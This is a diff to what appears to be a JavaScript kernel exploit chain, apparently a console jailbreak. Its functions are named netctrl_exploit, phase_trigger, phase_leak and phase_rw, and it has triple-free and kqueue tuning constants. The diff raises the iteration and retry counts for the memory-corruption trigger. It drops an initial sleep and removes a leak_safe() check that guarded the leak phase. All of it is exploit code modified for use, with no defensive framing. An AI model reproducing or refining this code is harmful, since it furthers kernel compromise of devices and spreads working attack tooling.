@@ -118,9 +118,9 @@ var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
 var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 6;
- var MAX_KQ = 4000;
-var MAX_ROUNDS_TWIN = 5;
+var TRIPLEFREE_ITERATIONS = 20;
+ var MAX_KQ = 20000;
+var MAX_ROUNDS_TWIN = 20;
 var MAX_ROUNDS_TRIPLET = 150;
 var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
@@ -927,12 +927,12 @@ function yield_to_render(callback) {
 var exploit_count = 0;
 var exploit_end = false;
 function netctrl_exploit() {
-  nanosleep_fun(2);
   setup_log_screen();
   var supported_fw = init();
   if (!supported_fw) {
     return;
   }
+
   log('Stability by M.ELHOUT');
   yield_to_render(phase_setup);
 }
@@ -941,6 +941,7 @@ function phase_setup () {
   log('Workers spawned')
   exploit_count = 0
   exploit_end = false
+
   yield_to_render(phase_trigger)
 }
 function phase_trigger() {
@@ -958,13 +959,9 @@ function phase_trigger() {
   yield_to_render(phase_leak);
 }
 function phase_leak() {
-  
-  if (!leak_safe()) {
-    yield_to_render(phase_trigger);
-    return;
-  }
 
   log('Leaking .....');
+
   yield_to_render(phase_rw);
 }
 function phase_rw() {
